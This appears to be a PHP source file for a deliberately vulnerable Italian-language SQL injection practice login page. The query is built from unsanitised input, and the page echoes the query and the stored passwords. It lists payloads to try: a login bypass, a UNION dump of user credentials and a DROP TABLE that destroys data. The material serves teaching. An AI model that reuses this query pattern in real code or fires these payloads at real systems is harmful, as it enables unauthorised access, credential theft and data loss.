<?php
// Connessione MySQL semplice (usa credenziali default XAMPP: root, no pass)
$servername = "localhost";
$username_db = "root";
$password_db = "";  // Vuoto per XAMPP default
$dbname = "hacker_lab";

$conn = new mysqli($servername, $username_db, $password_db, $dbname);

// Controlla connessione
if ($conn->connect_error) {
    die("Connessione fallita: " . $conn->connect_error);
}

// Se form inviato, processa (VULNERABILE AL 100% - Niente Blocchi!)
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $user_input = $_POST['username'];  // Input non sanitizzato!
    $pass_input = $_POST['password'];  // Può essere vuoto!
    
    // DEBUG: Stampa input e query (sempre!)
    echo "<div style='background: #f0f0f0; padding: 10px; margin: 10px; border:1px solid #ccc; font-family: monospace;'>";
    echo "<strong>DEBUG - Username:</strong> '$user_input'<br>";
    echo "<strong>DEBUG - Password:</strong> '$pass_input'<br>";
    $debug_sql = "SELECT * FROM users WHERE username='$user_input' AND password='$pass_input'";
    echo "<strong>DEBUG - Query SQL:</strong><br>" . htmlspecialchars($debug_sql) . "<br>";
    echo "</div>";
    
    // QUERY VULNERABILE con TRY-CATCH per catturare errori senza crash
    $sql = "SELECT * FROM users WHERE username='$user_input' AND password='$pass_input'";
    try {
        $result = $conn->query($sql);
        
        if ($result === false) {
            throw new Exception("Query fallita: " . $conn->error);
        }
        
        if ($result->num_rows > 0) {
            echo "<h2 style='color:green;'>LOGIN SUCCESS! Benvenuto, hacker! 😈</h2>";
            echo "<p>Utenti trovati: " . $result->num_rows . "</p>";
            while($row = $result->fetch_assoc()) {
                echo "<p>ID: " . $row["id"]. " - User: " . $row["username"] . " - Pass: " . $row["password"] . "</p>";
            }
        } else {
            echo "<h2 style='color:red;'>Login fallito. Prova a hackerare! 💣</h2>";
            echo "<p>Righe trovate: 0</p>";
        }
    } catch (Exception $e) {
        echo "<p style='color:orange; font-weight:bold;'>ERRORE SQL CATTURATO: " . $e->getMessage() . "</p>";
        echo "<p>Probabile sintassi nel payload – controlla spazi e virgolette! (O DROP eseguito? Controlla il DB!)</p>";
    }
}

$conn->close();
?>

<!DOCTYPE html>
<html lang="it">
<head>
    <title>Hacker Lab: SQLi Full Vulnerabile (No Blocchi!)</title>
    <style> body { font-family: Arial; text-align: center; margin: 50px; } input { padding: 10px; margin: 5px; } </style>
</head>
<body>
    <h1>Login Vulnerabile – Ora SENZA PROTEZIONI! 🧪</h1>
    <form method="POST" action="">
        <label>Username:</label><br>
        <input type="text" name="username" placeholder="admin" required><br>
        <label>Password:</label><br>
        <input type="password" name="password" placeholder="secret"><br>  <!-- No required -->
        <input type="submit" value="Invia (o Distruggi!)">
    </form>
    
    <h3>Payload da Provare (Password VUOTA):</h3>
    <ul>
        <li><code>' OR '1'='1' -- </code> (Bypass: tutti gli utenti! SPAZIO prima --)</li>
        <li><code>admin' -- </code> (Logga admin solo)</li>
        <li><code>' UNION SELECT id, username, password FROM users -- </code> (Dump dati)</li>
        <li><code>admin'; DROP TABLE users; -- </code> (DISTRUTTIVO: Cancella tabella! Ricrealo dopo 💥)</li>
    </ul>
    <p><strong>Warning:</strong> DROP funziona solo se hai privilegi root. Altrimenti, vedi errore. Testa responsabile!</p>
</body>
</html>